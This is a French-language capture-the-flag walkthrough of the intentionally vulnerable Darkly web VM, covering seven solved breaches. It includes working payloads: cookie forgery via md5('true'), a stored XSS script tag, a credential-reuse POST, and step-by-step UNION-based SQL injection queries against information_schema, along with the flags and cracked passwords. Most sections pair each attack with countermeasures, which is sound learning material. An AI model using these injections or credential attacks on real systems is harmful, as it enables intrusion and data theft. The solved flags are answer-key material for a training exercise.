# Darkly — Walkthrough complet

> Chronologie de ma progression sur les 14 breaches.
> Détails techniques dans chaque sous-dossier `XX_Breach_Name/Resources/`.

---

## Setup initial
- VM Darkly (i386) lancée
- Accès via navigateur
- Burp Suite en proxy

---

## Phase 1 — Reconnaissance initiale

### WhatWeb
$ whatweb 127.0.0.1:8080

Résultats clés :
- **PHP 5.5.9-1ubuntu4.29** (obsolète, multiples CVE)
- **nginx 1.4.6** (2014, très ancien)
- **Cookie suspect : I_am_admin** → piste immédiate d'élévation de privilège
- **JQuery, HTML5** → stack front classique

### Cartographie manuelle
Endpoints identifiés via navigation et Ctrl+U :
- Pages principales : `?page=survey`, `?page=member`, `?page=signin`
- Upload/search : `?page=upload`, `?page=searchimg`
- Feedback : `?page=feedback`
- Redirect : `?page=redirect&site=facebook` (param `site` → open redirect ?)
- Media : `?page=media&src=nsa` (param `src` → LFI ?)
- **Hash caché dans le footer** : `?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

### robots.txt
$ curl http://127.0.0.1:8080/robots.txt

User-agent: *
Disallow: /whatever
Disallow: /.hidden

→ Deux chemins "cachés" révélés par le dev lui-même.

### /whatever/
- Listing de répertoire activé (Directory Listing enabled)
- Contient un seul fichier : `htpasswd`

### /.hidden/
- Listing de répertoire activé
- Contient 26 dossiers (un par lettre) + README
- Structure labyrinthique récursive → **rabbit hole** (à confirmer plus tard, mis en standby)

### Gobuster
- 🟡 En cours : wordlist custom créée, scan à relancer avec `--exclude-length 975` (le serveur renvoie 200 sur toutes URLs inexistantes, taille fixe = page 404 déguisée par index.php)

---

## Breach #1 — Cookie Manipulation

**Flag :** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
**Dossier :** `01_Cookie_Manipulation/`

### Résumé
Cookie `I_am_admin` = `68934a3e9455fa72420237eb05902327` = md5("false").
Cracké via CrackStation. Forge de md5("true") → flag affiché.

### Commandes clés
$ echo -n "false" | md5sum   → confirme md5(false)
$ echo -n "true"  | md5sum   → b326b5062b2f0e69046810717534cb09

---

## Breach #2 — Hidden Page / Information Disclosure
**Flag :** `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`
**Dossier :** `02_Hidden_Page/`

### Résumé
Lien caché dans le footer de `index.php` pointant vers une page "obscure" nommée avec un SHA-256 :
`?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

La page sert directement un `<script>alert('Good job! Flag : ...')</script>` en dur. Flag obtenu par simple clic.

### Faille exploitée
- **Security Through Obscurity** : le dev a cru cacher la page en la nommant avec un hash improbable.
- **Information Disclosure** : le lien est laissé visible dans le HTML du footer, accessible via Ctrl+U ou clic.

### Règle violée
> L'URL n'est pas un secret. Toute ressource non protégée par authentification est publique.

---

## Breach #3 — Directory Listing + Weak Password Storage
**Flag :** [pas de flag direct — credentials récupérés et utilisés au breach #5]
**Dossier :** `03_Htpasswd_Crack/`

### Résumé
Exposition d'un fichier `htpasswd` via directory listing activé sur `/whatever/`.
Le fichier contient un couple `user:hash` avec un hash MD5 non salé, cracké en ligne.

### Méthode
1. Lecture de `robots.txt` → chemin `/whatever/` révélé
2. Accès au listing → fichier `htpasswd` visible
3. `curl http://127.0.0.1:8080/whatever/htpasswd` → `root:437394baff5aa33daa618be47b75cb49`
4. Identification du hash : 32 hexa = MD5
5. Crack via CrackStation → `437394baff5aa33daa618be47b75cb49` = `qwerty123@`

### Failles cumulées
- **Security Misconfiguration** — Directory listing actif sur un répertoire contenant des secrets
- **Information Disclosure via robots.txt** — le dev a listé explicitement ses chemins sensibles
- **Cryptographic Failure** — hash MD5 non salé pour stocker un mot de passe
- **Weak Password** — "qwerty123@" cassable en < 1 seconde (présent dans rockyou.txt)

---

## Breach #4 — Stored XSS
**Flag :** `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`
**Dossier :** `04_Stored_XSS/`

### Résumé
Injection d'un payload `<script>alert(...)</script>` dans le formulaire `?page=feedback`. Le serveur stocke et restitue l'input sans échappement → exécution du JS au rendu de la page.

### Méthode
1. Champ vulnérable identifié sur `?page=feedback`
2. Payload injecté : `<script>alert('XSS')</script>`
3. Submit → reload → script exécuté → flag affiché

### Faille exploitée
- **Stored XSS (OWASP A03:2021 — Injection)**
- Absence de sanitization à l'entrée
- Absence d'output encoding à la sortie (pas de `htmlspecialchars()` côté PHP)

### Contre-mesures
- `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` à l'affichage (PHP)
- Auto-escape dans React/Vue (déjà appliqué dans VoidTextile, Camagru)
- `Content-Security-Policy: script-src 'self'` pour bloquer les scripts inline
- Cookies `HttpOnly` pour empêcher le vol de session via XSS

---

## Breach #5 — Authentication Bypass via Credential Reuse
**Flag :** `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`
**Dossier :** `05_Admin_Auth/`

### Résumé
Découverte d'une zone admin `/admin/` accessible directement sans Basic Auth, contenant un formulaire de login. Les credentials récupérés au breach #3 (`root:qwerty123@`) sont valides → flag.

### Méthode
1. Test du chemin physique `/admin/` (hors routeur `?page=`)
2. `curl http://127.0.0.1:8080/admin/` → formulaire de login (200, pas de Basic Auth)
3. POST des creds htpasswd :
   ```
   curl -X POST http://127.0.0.1:8080/admin/ \
     -d "username=root&password=qwerty123@&Login=Login"
   ```
4. Réponse : `<h2>The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff</h2>`

### Architecture défaillante
Deux systèmes de routing parallèles sur le même serveur :
- **`?page=X`** → routeur PHP via `index.php`
- **`/admin/`** → chemin physique servi directement par nginx

La zone `/admin/` échappe aux middlewares du routeur principal. Cumul de fautes :
- Le htpasswd existe mais n'est pas configuré dans nginx (`auth_basic` absent)
- Le formulaire PHP valide en dur contre les **mêmes creds** que ceux exposés publiquement
- Aucun rate limiting, aucune 2FA
- Typo `recquired` → indicateur de code amateur

### Failles cumulées
- **A07:2021 — Identification and Authentication Failures** (credential reuse)
- **A05:2021 — Security Misconfiguration** (htpasswd non appliqué côté serveur)

### Contre-mesures
- nginx : `auth_basic` + `auth_basic_user_file` sur `/admin/`
- Stocker htpasswd **hors document root** (`/etc/nginx/.htpasswd`)
- bcrypt au lieu de MD5 (`htpasswd -B`)
- Rate limiting via `limit_req` nginx
- 2FA TOTP côté applicatif

---

## Breach #6 — SQLi UNION-Based sur `?page=member`
**Flag :** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
**Dossier :** `06_SQLi_Member/`

### Résumé
Injection SQL UNION-based sur le param `id` de `?page=member`. Énumération du schéma via `information_schema`, extraction des credentials de la table `users`, crack MD5 → transformation lower + SHA256 = flag.

### Méthode complète

**1. Détection de l'injection**
```
curl -s "http://127.0.0.1:8080/?page=member&id=1&Submit=Submit"
→ ID: 1 - First name: one - Surname: me

curl -s "http://127.0.0.1:8080/?page=member&id=1%27&Submit=Submit"
→ "You have an error in your SQL syntax... near '\''" (MariaDB error visible)

curl -s "http://127.0.0.1:8080/?page=member&id=1+OR+1%3D1&Submit=Submit"
→ Retourne TOUS les enregistrements (dont "First name: Flag - Surname: GetThe")
```

**2. Énumération du nombre de colonnes (ORDER BY)**
```
?id=1+ORDER+BY+1--+   → OK
?id=1+ORDER+BY+2--+   → OK
?id=1+ORDER+BY+3--+   → "Unknown column '3' in 'order clause'"
```
→ Requête à **2 colonnes**.

**3. Mapping des colonnes via UNION SELECT**
```
?id=0+UNION+SELECT+1,2--+
→ First name: 1 - Surname: 2
```

**4. Énumération du schéma**
```
?id=0+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_schema=database()--+
```
Table `users` avec colonnes : `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, **`countersign`** ← suspect.

**5. Extraction des credentials**
```
?id=0+UNION+SELECT+countersign,Commentaire+FROM+users--+
```
4 hashes MD5 + commentaires. Le 4e contient l'indice :
> `5ff9d0165b4f92b14994e5c685cdce28`
> "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

**6. Crack et transformation**
- CrackStation : `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
- Lower : `fortytwo`
- SHA-256 : `echo -n "fortytwo" | sha256sum` → `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Failles exploitées
- **A03:2021 — Injection (SQLi)** : aucune préparation/échappement du param `id`
- **Verbose error messages** : MariaDB renvoie l'erreur SQL complète au client
- **Cryptographic Failure** : MD5 non salé pour stocker des mots de passe
- **Information Disclosure** : indice du flag stocké en clair dans la base

### Contre-mesures
- Requêtes préparées (PDO en PHP) : `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?")`
- Cast strict du param : `intval($_GET['id'])`
- Désactiver les erreurs SQL en production (`display_errors = Off`)
- bcrypt/argon2 pour stocker des mots de passe
- Principe du moindre privilège sur le compte MySQL applicatif

---

## Breach #7 — SQLi UNION-Based sur `?page=searchimg`
**Flag :** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
**Dossier :** `07_SQLi_SearchImg/`

### Résumé
Même pattern que breach #6 mais sur un autre endpoint. SQLi UNION sur `?page=searchimg&id=`. La base utilisée est **différente** de celle de `?page=member` — le serveur fait un `mysql_select_db()` différent selon la page.

### Méthode

**1. Détection silencieuse**
Pas d'erreur SQL visible (au contraire de member), mais comportement différent :
```
?id=1&Submit=Submit                    → ID: 1 - Title: Nsa - Url : ...
?id=1+ORDER+BY+1--+&Submit=Submit      → OK
?id=1+ORDER+BY+2--+&Submit=Submit      → OK
?id=1+ORDER+BY+3--+&Submit=Submit      → résultat vide (injection plante silencieusement)`
```
→ 2 colonnes, mais erreurs supprimées côté display.

**2. Confirmation UNION**
```
?id=0+UNION+SELECT+1,2--+&Submit=Submit
→ Title: 2 - Url: 1   (mapping: col1 = Url, col2 = Title)
```

**3. Énumération du schéma**
```
?id=0+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+WHERE+table_schema=database()--+
```
**Une seule table** : `list_images` avec colonnes `id`, `url`, `title`, `comment`.

→ Découverte importante : cette base est **différente** de celle de breach #6 (qui contient `users`). Donc 2 databases distinctes côté serveur.

**4. Extraction du contenu**
```
?id=0+UNION+SELECT+comment,title+FROM+list_images--+
```
5 enregistrements. Le 5e contient l'indice :
> "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"

**5. Crack et transformation**
- CrackStation : `1928e8083cf461a51303633093573c46` → `albatroz`
- Lower : `albatroz` (déjà en minuscules)
- SHA-256 : `echo -n "albatroz" | sha256sum` → `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Différences avec breach #6
- **Erreurs SQL masquées** : Darkly a appliqué `display_errors = Off` sur cette page mais pas sur member → incohérence de hardening
- **Database différente** : preuve que le serveur fait du `mysql_select_db()` dynamique → architecture multi-base
- **Indice directement dans `comment`** : la table contenait littéralement les instructions du flag

### Leçon méthodologique
Toutes les colonnes de toutes les tables doivent être dump dans un pentest. Les indices (et secrets) se cachent souvent dans `comment`, `description`, `notes`, `metadata`, `meta`, `info`.

---

## État global
| # | Breach | Statut |
|---|---|---|
| 1 | Cookie Manipulation | ✅ Flag validé |
| 2 | Hidden Footer Page | ✅ Flag validé |
| 3 | Htpasswd Disclosure | ✅ Credentials exploités au #5 |
| 4 | Stored XSS | ✅ Flag validé |
| 5 | Admin Auth Bypass | ✅ Flag validé |
| 6 | SQLi UNION sur `?page=member` | ✅ Flag validé |
| 7 | SQLi UNION sur `?page=searchimg` | ✅ Flag validé |
| 8-14 | — | À explorer |

**Score : 7/14**

---

## Prochaines pistes à tester (ordre de priorité)

### Priorité haute — ROI immédiat
- [ ] **Open Redirect sur `?page=redirect&site=`** : tester URL externe arbitraire
- [ ] **Path Traversal sur `?page=media&src=`** : filtre détecté (refuse `php://filter`), tester `../`, encodage URL
- [ ] **File Upload sur `?page=upload`** : upload accepte les vraies images, mais aucun flag affiché → critère caché à identifier

### Priorité moyenne
- [ ] **Reflected XSS sur `?page=searchimg`** : payload dans param `id` (en plus de la SQLi déjà exploitée)
- [ ] **`?page=recover`** : SQLi probable, non testé
- [ ] **`?page=survey`** : non exploré

### Priorité basse / parallèle
- [ ] **Gobuster** : finir le scan avec `--exclude-length 975`
- [ ] **`.hidden/` parsing** : `wget -r` + grep récursif (bypass du rabbit hole textuel)
- [ ] **sitemap.xml** : vérification rapide

---

## Leçons techniques cumulées
1. **Reconnaissance d'abord** : `whatweb`, `robots.txt`, Ctrl+U, sitemap → toujours avant tout payload
2. **Deux systèmes de routing peuvent coexister** : routeur applicatif (`?page=`) vs filesystem (`/admin/`). Tester les deux.
3. **MD5 et SHA-1 sont morts** pour le stockage de mots de passe. CrackStation casse en secondes.
4. **Security through obscurity ≠ sécurité** : breach #2 et #5 démontrent que cacher un chemin n'est pas une protection.
5. **Credential reuse** = faille systémique. Un seul secret exposé compromet tous les systèmes qui le réutilisent.
6. **Méthode SQLi UNION-based** : (1) détecter avec `'`, (2) compter les colonnes via `ORDER BY`, (3) mapper via `UNION SELECT 1,2,...`, (4) énumérer schéma via `information_schema`, (5) extraire les colonnes intéressantes (passwords, comments, secrets).
7. **Verbose error messages** = fuite d'information critique. Une erreur SQL complète révèle le SGBD, la version, la structure de la requête.
8. **Multi-base = surface d'attaque démultipliée** : un même serveur peut servir plusieurs databases différentes selon la page → toujours énumérer le schéma sur **chaque** point d'injection.
9. **Pattern Darkly récurrent** : MD5 → CrackStation → lower → SHA-256 = flag. À tester systématiquement quand un hash est extrait.
10. **Toutes les colonnes valent le dump** : indices et secrets se cachent souvent dans `comment`, `description`, `notes`, `metadata`.